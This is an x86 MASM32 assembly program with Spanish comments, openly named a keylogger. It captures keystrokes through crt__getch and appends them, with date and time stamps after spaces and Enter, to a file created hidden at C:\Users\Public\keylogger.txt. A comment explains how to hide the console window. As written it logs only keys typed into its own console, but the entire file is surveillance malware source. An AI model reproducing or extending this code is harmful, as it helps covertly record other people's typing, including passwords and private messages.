.386
;model
.model flat, stdcall				;flat es como small
option casemap:none
;includes
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\masm32rt.inc
include \masm32\include\user32.inc
;librerias
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\user32.lib

;data segment
.data
	directorio byte "C:\Users\Public\keylogger.txt",NULL
	error1 db "No se pudo crear el archivo",0

	formatofecha db " dd/MM/yyyy ",0
	formatohora db " hh:mm:ss ",0
.data?
	fechaBuf db 50 dup(?)
	horaBuf db 50 dup(?)
	manejo dd ?				;handler del archivo
	consola dd ?			;handler de la consola
	key dd ?				;caracter
	bytesw dd ?				;bytes escritos

.code
program:
	call main

	main proc
		invoke GetConsoleWindow
		mov consola, eax
		;0 = HIDE	5 = SHOW
		invoke ShowWindow,consola,5

		mov edx, offset directorio
		INVOKE CreateFile, edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN,NULL	
		INVOKE SetFilePointer, eax, 0, 0, FILE_END

		mov manejo, eax
		cmp eax, INVALID_HANDLE_VALUE	;Error de creacion del archivo
		je fin_programa					;Si hay un handler inv�lido, cierra el programa

		keylogger:

		call crt__getch					;Obtiene el caracter presionado

		mov key, eax
		cmp eax, 0
		je keylogger
		
		INVOKE CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
		mov manejo, eax
		INVOKE SetFilePointer, manejo, 0, 0, FILE_END
		INVOKE WriteFile,manejo,addr key,1,addr bytesw,NULL	;Escritura del caracter
		mov eax, manejo
		INVOKE CloseHandle, eax
		

		mov ebx, key						
		cmp ebx, 20h						;si es un espacio
		jz ObtenerFH
		cmp ebx, 0dh						;si es un ENTER
		jz ObtenerFH						;imprime la fecha y hora de impresion
		jmp keylogger

		ObtenerFH:

		INVOKE CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
		mov manejo, eax
		INVOKE SetFilePointer, manejo, 0, 0, FILE_END

		invoke GetDateFormat, 0,0, \
		0, addr formatofecha, addr fechaBuf, 50
		;mov ebx, offset fechaBuf
		;mov byte ptr[ebx-1], " "	; reemplazamos todo lo nulo con espacios

		invoke GetTimeFormat, 0, 0, \
		0, addr formatohora, addr horaBuf, 50

		INVOKE WriteFile,manejo,addr fechaBuf,11,addr bytesw,NULL	;Escritura del buffer de fecha
		INVOKE WriteFile,manejo,addr horaBuf,10,addr bytesw,NULL	;Escritura del buffer de hora

		invoke CloseHandle, manejo
		jmp keylogger

		fin_programa:

		invoke ExitProcess,0
		ret
	main endp
end program

